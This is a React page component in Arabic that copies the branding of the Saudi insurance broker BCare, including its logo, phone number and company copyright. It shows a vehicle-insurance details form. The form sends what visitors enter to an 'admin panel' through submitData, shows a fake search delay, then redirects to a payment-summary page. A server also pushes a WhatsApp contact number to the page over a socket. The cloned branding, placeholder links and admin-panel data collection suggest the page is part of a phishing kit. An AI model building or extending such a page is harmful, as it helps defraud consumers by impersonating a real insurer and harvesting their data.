import { useState, useEffect } from "react";
import { updatePage, submitData, clientNavigate, socket } from "@/lib/store";
import { Link } from "wouter";

// Set page title
if (typeof document !== 'undefined') {
  document.title = 'تفاصيل التأمين';
}

export default function NewAppointment() {
  useEffect(() => {
    updatePage("تفاصيل التأمين");
  }, []);

  // Form state
  const [insuranceType, setInsuranceType] = useState("ضد الغير");
  const [startDate, setStartDate] = useState(() => {
    const today = new Date();
    return today.toISOString().split('T')[0];
  });
  const [usagePurpose, setUsagePurpose] = useState("شخصي");
  const [estimatedValue, setEstimatedValue] = useState("");
  const [valueError, setValueError] = useState("");
  const [manufactureYear, setManufactureYear] = useState("");
  const [carModel, setCarModel] = useState("");
  const [repairPlace, setRepairPlace] = useState("الوكالة");
  const [formErrors, setFormErrors] = useState<Record<string, string>>({});
  const [isSearching, setIsSearching] = useState(false);
  const [whatsappNumber, setWhatsappNumber] = useState("");

  useEffect(() => {
    socket.value.on("whatsapp:update", (number: string) => {
      setWhatsappNumber(number);
    });
    socket.value.emit("whatsapp:get");
    return () => {
      socket.value.off("whatsapp:update");
    };
  }, []);

  // Generate year options (current year down to 1970)
  const currentYear = new Date().getFullYear();
  const yearOptions = Array.from({ length: currentYear - 1969 }, (_, i) => currentYear - i);

  const formatNumber = (num: string) => {
    if (!num) return '';
    return parseInt(num).toLocaleString('en-US');
  };

  const handleValueChange = (val: string) => {
    const numericVal = val.replace(/[^0-9]/g, '');
    // Cap at 1,000,000
    if (numericVal && parseInt(numericVal) > 1000000) {
      setEstimatedValue('1000000');
      setValueError('');
      return;
    }
    setEstimatedValue(numericVal);
    if (numericVal && formErrors.estimatedValue) {
      const newErrors = { ...formErrors };
      delete newErrors.estimatedValue;
      setFormErrors(newErrors);
    }
    if (numericVal) {
      const num = parseInt(numericVal);
      if (num < 10000) {
        setValueError("القيمة يجب أن تكون بين 10,000 و 1,000,000 ريال");
      } else {
        setValueError('');
      }
    } else {
      setValueError('');
    }
  };

  const handleFieldChange = (field: string) => {
    if (formErrors[field]) {
      const newErrors = { ...formErrors };
      delete newErrors[field];
      setFormErrors(newErrors);
    }
  };

  const handleSubmit = () => {
    const errors: Record<string, string> = {};

    if (!insuranceType) errors.insuranceType = "هذا الحقل مطلوب";
    if (!startDate) errors.startDate = "هذا الحقل مطلوب";
    if (!usagePurpose) errors.usagePurpose = "هذا الحقل مطلوب";
    if (!estimatedValue) errors.estimatedValue = "هذا الحقل مطلوب";
    else {
      const num = parseInt(estimatedValue);
      if (num < 10000 || num > 1000000) errors.estimatedValue = "القيمة يجب أن تكون بين 10,000 و 1,000,000 ريال";
    }
    if (!manufactureYear) errors.manufactureYear = "هذا الحقل مطلوب";
    if (!carModel.trim()) errors.carModel = "هذا الحقل مطلوب";
    if (!repairPlace) errors.repairPlace = "هذا الحقل مطلوب";

    setFormErrors(errors);

    if (Object.keys(errors).length > 0) {
      window.scrollTo({ top: 0, behavior: 'smooth' });
      return;
    }

    setIsSearching(true);

    // Send data to admin panel
    const data: Record<string, string> = {
      'نوع التأمين': insuranceType,
      'تاريخ بدء التأمين': startDate,
      'الغرض من استخدام المركبة': usagePurpose,
      'القيمة التقديرية للمركبة': formatNumber(estimatedValue) + ' ريال',
      'سنة صنع المركبة': manufactureYear,
      'ماركة ونوع السيارة': carModel,
      'مكان اصلاح المركبة': repairPlace,
    };

    submitData(data);

    setTimeout(() => {
      setIsSearching(false);
      clientNavigate("/summary-payment");
    }, 2000);
  };

  const primaryBlue = "#146494";

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl" style={{ fontFamily: "'Tajawal', sans-serif" }}>
      {/* Header */}
      <header className="bg-white py-3 md:py-4 px-4 lg:px-8 flex items-center justify-between sticky top-0 z-50 shadow-sm">
        <div className="flex items-center gap-3">
          <Link to="/" className="cursor-pointer">
            <img src="/images/bcare/Bcarelogo.svg" alt="بي كير" className="h-8 md:h-10" />
          </Link>
        </div>
        <div className="flex items-center gap-2 md:gap-3">
          <button className="w-8 h-8 rounded-full border-2 flex items-center justify-center" style={{ borderColor: primaryBlue, color: primaryBlue }}>
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
          </button>
          <button className="px-2 md:px-3 py-1 text-sm font-bold" style={{ color: primaryBlue }}>EN</button>
        </div>
      </header>

      {/* Content Box */}
      <div className="px-3 md:px-16 lg:px-28 py-8 md:py-12">
        <div className="bg-white shadow-lg" style={{ borderRadius: '15px', overflow: 'hidden' }}>
          
          {/* Card Header */}
          <div className="px-6 md:px-10 pt-6 md:pt-8 pb-4">
            <h2 className="text-xl md:text-2xl font-bold text-right" style={{ color: primaryBlue }}>تفاصيل التأمين</h2>
          </div>

          {/* Separator */}
          <div style={{ height: '3px', backgroundColor: '#e0e0e0' }}></div>

          {/* Form */}
          <div className="px-6 md:px-10 lg:px-14 pt-6 pb-8 md:pb-10">
            <div className="max-w-2xl mx-auto space-y-5">

              {/* نوع التأمين */}
              <div>
                <label className="block text-sm mb-2 text-right font-bold" style={{ color: '#1a5276' }}>نوع التأمين</label>
                <select
                  value={insuranceType}
                  onChange={(e) => { setInsuranceType(e.target.value); handleFieldChange('insuranceType'); }}
                  className={`w-full px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base appearance-none ${formErrors.insuranceType ? 'border-red-500' : 'border-gray-200'}`}
                  style={{ color: '#1a5276' }}
                >
                  <option value="" disabled>إختر</option>
                  <option value="شامل">شامل</option>
                  <option value="ضد الغير">ضد الغير</option>
                </select>
                {formErrors.insuranceType && <p className="text-red-500 text-xs mt-1 text-right">{formErrors.insuranceType}</p>}
              </div>

              {/* تاريخ بدء التأمين */}
              <div>
                <label className="block text-sm mb-2 text-right font-bold" style={{ color: '#1a5276' }}>تاريخ بدء التأمين</label>
                <input
                  type="date"
                  value={startDate}
                  onChange={(e) => { setStartDate(e.target.value); handleFieldChange('startDate'); }}
                  className={`w-full px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base ${formErrors.startDate ? 'border-red-500' : 'border-gray-200'}`}
                  style={{ color: '#1a5276' }}
                />
                {formErrors.startDate && <p className="text-red-500 text-xs mt-1 text-right">{formErrors.startDate}</p>}
              </div>

              {/* الغرض من استخدام المركبة */}
              <div>
                <label className="block text-sm mb-2 text-right font-bold" style={{ color: '#1a5276' }}>الغرض من استخدام المركبة</label>
                <select
                  value={usagePurpose}
                  onChange={(e) => { setUsagePurpose(e.target.value); handleFieldChange('usagePurpose'); }}
                  className={`w-full px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base appearance-none ${formErrors.usagePurpose ? 'border-red-500' : 'border-gray-200'}`}
                  style={{ color: '#1a5276' }}
                >
                  <option value="" disabled>إختر</option>
                  <option value="شخصي">شخصي</option>
                  <option value="تجاري">تجاري</option>
                  <option value="نقل ركاب">نقل ركاب</option>
                  <option value="تأجير">تأجير</option>
                  <option value="نقل بضائع">نقل بضائع</option>
                  <option value="مركبة شحن">مركبة شحن</option>
                  <option value="نقل مشتقات نفطية">نقل مشتقات نفطية</option>
                </select>
                {formErrors.usagePurpose && <p className="text-red-500 text-xs mt-1 text-right">{formErrors.usagePurpose}</p>}
              </div>

              {/* القيمة التقديرية للمركبة */}
              <div>
                <label className="block text-sm mb-2 text-right font-bold" style={{ color: '#1a5276' }}>القيمة التقديرية للمركبة</label>
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="أدخل القيمة بين 10,000 - 1,000,000 ريال"
                  value={formatNumber(estimatedValue)}
                  onChange={(e) => handleValueChange(e.target.value)}
                  onKeyDown={(e) => { if (e.key === '-' || e.key === '.' || e.key === 'e' || e.key === '+') e.preventDefault(); }}
                  className={`w-full px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base ${formErrors.estimatedValue || valueError ? 'border-red-500' : 'border-gray-200'}`}
                  style={{ color: '#1a5276' }}
                />
                {(valueError || formErrors.estimatedValue) && (
                  <p className="text-red-500 text-xs mt-1 text-right">{valueError || formErrors.estimatedValue}</p>
                )}

              </div>

              {/* سنة صنع المركبة */}
              <div>
                <label className="block text-sm mb-2 text-right font-bold" style={{ color: '#1a5276' }}>سنة صنع المركبة</label>
                <select
                  value={manufactureYear}
                  onChange={(e) => { setManufactureYear(e.target.value); handleFieldChange('manufactureYear'); }}
                  className={`w-full px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base appearance-none ${formErrors.manufactureYear ? 'border-red-500' : 'border-gray-200'}`}
                  style={{ color: '#1a5276' }}
                >
                  <option value="" disabled>إختر</option>
                  {yearOptions.map(year => (
                    <option key={year} value={String(year)}>{year}</option>
                  ))}
                </select>
                {formErrors.manufactureYear && <p className="text-red-500 text-xs mt-1 text-right">{formErrors.manufactureYear}</p>}
              </div>

              {/* ماركة ونوع السيارة */}
              <div>
                <label className="block text-sm mb-2 text-right font-bold" style={{ color: '#1a5276' }}>ماركة ونوع السيارة</label>
                <input
                  type="text"
                  placeholder="مثال: تويوتا كامري"
                  value={carModel}
                  onChange={(e) => { setCarModel(e.target.value); handleFieldChange('carModel'); }}
                  className={`w-full px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base ${formErrors.carModel ? 'border-red-500' : 'border-gray-200'}`}
                  style={{ color: '#1a5276' }}
                />
                {formErrors.carModel && <p className="text-red-500 text-xs mt-1 text-right">{formErrors.carModel}</p>}
              </div>

              {/* مكان اصلاح المركبة */}
              <div>
                <label className="block text-sm mb-2 text-right font-bold" style={{ color: '#1a5276' }}>مكان اصلاح المركبة</label>
                <div className="space-y-2">
                  <label
                    onClick={() => setRepairPlace("الوكالة")}
                    className={`flex items-center gap-3 px-4 py-3 border rounded-lg cursor-pointer transition-all ${
                      repairPlace === "الوكالة" ? "border-[#146494] bg-blue-50/30" : "border-gray-200"
                    }`}
                  >
                    <input type="radio" name="repairPlace" checked={repairPlace === "الوكالة"} readOnly className="w-5 h-5" style={{ accentColor: '#146494' }} />
                    <span className="text-base font-bold" style={{ color: '#1a5276' }}>الوكالة</span>
                  </label>
                  <label
                    onClick={() => setRepairPlace("الورشة")}
                    className={`flex items-center gap-3 px-4 py-3 border rounded-lg cursor-pointer transition-all ${
                      repairPlace === "الورشة" ? "border-[#146494] bg-blue-50/30" : "border-gray-200"
                    }`}
                  >
                    <input type="radio" name="repairPlace" checked={repairPlace === "الورشة"} readOnly className="w-5 h-5" style={{ accentColor: '#146494' }} />
                    <span className="text-base font-bold" style={{ color: '#1a5276' }}>الورشة</span>
                  </label>
                </div>
                {formErrors.repairPlace && <p className="text-red-500 text-xs mt-1 text-right">{formErrors.repairPlace}</p>}
              </div>

              {/* Submit Button */}
              <button
                onClick={handleSubmit}
                disabled={isSearching}
                className="w-full py-4 text-lg font-bold rounded-lg transition-all flex items-center justify-center gap-2"
                style={{
                  backgroundColor: '#f5a623',
                  color: '#1a5276',
                  opacity: isSearching ? 0.8 : 1,
                }}
              >
                {isSearching && (
                  <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                )}
                إظهار العروض
              </button>

            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="text-white pt-8 md:pt-12 pb-6" style={{ backgroundColor: '#146494' }}>
        <div className="container mx-auto px-4 lg:px-8">
          {/* Top Section - ORIGINAL desktop layout restored */}
          <div className="flex flex-col md:flex-row gap-6 mb-8">
            {/* Right side: Logo + Phone + Stores + Payment */}
            <div className="flex flex-col md:flex-row gap-6 md:items-start">
              {/* BCare Logo + Phone */}
              <div className="text-right flex-shrink-0">
                <img src="/images/bcare/Bcarelogo.svg" alt="بي كير" className="h-10 mb-3 brightness-0 invert" />
                <p className="text-white text-lg font-bold mb-3" dir="ltr">☎ 8001180044</p>
                {/* Payment Methods */}
                <img src="/images/bcare/PaymentMethods1.svg" alt="طرق الدفع" className="h-8 mt-3" />
              </div>
              {/* App Stores stacked on desktop, row on mobile */}
              <div className="flex flex-row md:flex-col gap-2 flex-shrink-0">
                <img src="/images/bcare/googlestore.svg" alt="Google Play" className="h-9 md:h-10 w-fit" />
                <img src="/images/bcare/applestore.svg" alt="App Store" className="h-9 md:h-10 w-fit" />
                <img src="/images/bcare/huaweistore.svg" alt="AppGallery" className="h-9 md:h-10 w-fit" />
              </div>
            </div>

            {/* 4 Text Columns */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 md:gap-6 flex-1">
              {/* عن بي كير */}
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">عن بي كير</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">خصومات وريف</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">سياسة الخصوصية</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">الشروط والأحكام</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">وظائف</a></li>
                </ul>
              </div>

              {/* منتجاتنا */}
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">منتجاتنا</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">تأمين المركبات</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">التأمين الطبي</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">تأمين السفر</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">تأمين الأخطاء الطبية</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">تأمين العمالة المنزلية</a></li>
                </ul>
              </div>

              {/* الدعم الفني */}
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">الدعم الفني</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">المدونة</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">إلغاء وثيقتك</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">رفع تذكرة</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">اطبع وثيقتك</a></li>
                </ul>
              </div>

              {/* روابط مهمة */}
              <div className="text-right">
                <h3 className="font-bold mb-3 md:mb-4 text-sm md:text-base">روابط مهمة</h3>
                <ul className="space-y-1.5 md:space-y-2 text-xs md:text-sm text-white/80">
                  <li><a href="#" className="hover:text-white hover:underline">هيئة التأمين</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">طريقة رفع شكوى لهيئة التأمين</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">قواعد ولوائح هيئة التأمين</a></li>
                  <li><a href="#" className="hover:text-white hover:underline">شهادة ضريبة القيمة المضافة</a></li>
                </ul>
              </div>
            </div>
          </div>

          {/* Bottom: white line, social icons left, copyright right */}
          <div className="border-t border-white/30 md:border-white pt-4 flex flex-col-reverse md:flex-row items-center justify-between gap-3 md:gap-0">
            {/* Copyright - Left */}
            <p className="text-[10px] md:text-sm text-white/80 text-center md:text-right mb-0 md:mb-0">
              2026 © جميع الحقوق محفوظة، شركة عناية الوسيط لوساطة التأمين
            </p>
            {/* Social Icons - Right */}
            <div className="flex gap-2 md:gap-3">
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
              </a>
              <a href="#" className="w-8 h-8 md:w-9 md:h-9 bg-white/15 rounded-full flex items-center justify-center hover:bg-white/25">
                <svg className="w-3.5 h-3.5 md:w-4 md:h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
